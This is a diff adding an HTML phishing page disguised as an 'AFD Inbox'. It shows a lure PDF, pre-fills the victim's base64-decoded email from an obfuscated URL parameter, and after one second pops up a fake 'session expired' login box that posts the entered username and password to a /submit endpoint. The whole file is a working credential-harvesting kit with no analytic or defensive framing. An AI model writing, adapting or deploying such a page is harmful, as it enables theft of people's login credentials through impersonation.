@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AFD Inbox  </title>
+	  <!-- <link rel="icon" type="image/png" sizes="32x32" href="https://id.ionos.co.uk/image/favicon-32px.png"> -->
+	    <link rel="icon" type="image/png" sizes="16x16" href="./files/favicon.png">
+	    <!-- <link rel="icon" type="image/png" sizes="48x48" href="https://id.ionos.co.uk/image/favicon-48px.png"> -->
+    
+    <style>
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            height: 300px;
+            width: 400px;
+            transform: translate(-50%, -50%);
+            background-color:white;
+            padding: 20px;
+            border: 1px solid transparent;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.93);
+            z-index: 999;
+        }
+        .inputbox {
+            border: 1px solid black;
+            padding: 0;
+            width: 235px;
+            height: 20px;
+            border-radius: 5px;
+            }
+
+        .label{
+            font-family: "Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;
+            color:black;
+             
+        }
+
+        .button{
+            background-color: #0b2a63;
+            border-color: white;
+            height: 20px;
+            width:80px;
+            color:white;
+            font:18px;
+            border-radius: 3px;
+            border: 1px solid #999;
+            cursor: pointer;
+            }
+
+        p{
+
+            font-family: "Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;
+            color: black;
+        }
+        
+    </style>
+    <script>
+        // Function to extract query parameter value
+         function getQueryParameter(parameterName) {
+           var queryString = window.location.search;
+           var urlParams = new URLSearchParams(queryString);
+           return urlParams.get(parameterName);
+         }
+         // Get the value from the 'data' query parameter
+         var value = getQueryParameter('nxzbciuzxcbkasidhnasdiuasdbcuiasbduiasdbczbisudbf');
+         
+         if(value == null) {
+         
+             window.location.href = "error.html";
+         
+         }else{
+         
+         var b64name = atob(value);
+         
+         function onLoad() {
+           var b64name = atob(value);
+           var inputField = document.getElementById('username');
+           inputField.value = b64name;
+         }
+         }
+
+
+       </script> 
+</head>
+<body onload="onLoad();">
+    <object style="height:950px; width:1920px;" data="./Pakistan Course Booklet FY 2024-2025 Gratis Basis.pdf"></object>
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="loginPopup">
+        
+        <img  src="./files/Logo.png" alt="">
+        <br>
+        <p>Your sesssion expired.</p>
+
+        <form style="margin-top:2%;" id="loginForm" name="loginForm" accept-charset="UTF-8">
+            <label class="label" for="username">Username:</label><br>
+            <input class="inputbox" type="text" id="username" name="username" required="" vlaue=""><br><br>
+            <label class="label" for="password">Password:</label><br>
+            <input class="inputbox" type="password" id="password" name="password" required="" vlaue=""><br><br>
+            <input class="button" type="submit" value="Submit">
+        </form>
+    </div>
+
+    <script>
+        // Show the popup and overlay after a delay
+        setTimeout(function() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('loginPopup').style.display = 'block';
+        }, 1000);
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const formData = { username, password };
+
+            fetch('/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Server response:', data);
+
+                if (data.success) {
+                    // Clear the form and hide the popup
+                    document.getElementById('loginForm').reset();
+                    document.getElementById('overlay').style.display = 'none';
+                    document.getElementById('loginPopup').style.display = 'none';
+                } else {
+                    // Login failed
+                    alert(data.message || 'Login failed. Please try again.');
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            });
+        });
+    </script>
+</body>
+</html>
